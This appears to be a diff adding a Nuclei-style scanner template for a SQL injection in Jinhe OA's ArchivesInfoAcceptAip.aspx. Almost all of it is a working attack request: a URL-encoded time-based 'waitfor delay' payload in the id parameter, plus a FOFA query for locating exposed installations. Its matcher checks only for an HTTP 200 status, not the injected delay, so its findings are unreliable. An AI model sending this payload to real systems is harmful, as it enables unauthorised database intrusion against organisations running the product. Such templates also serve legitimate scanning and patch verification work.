@@ -1,0 +1,35 @@
+id: poc-if0gptk5h8ivt8pc
+info:
+  name: 金和OA ArchivesInfoAcceptAip.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/if0gptk5h8ivt8pc'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: if0gptk5h8ivt8pc
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'GET /c6/Jhsoft.Web.Archives/ArchivesInfoAcceptAip.aspx/?id=%31%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a%35%27%2d%2d  HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Cookie: ASP.NET_SessionId=woqhdwkih2whsz02t3cmubzu
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
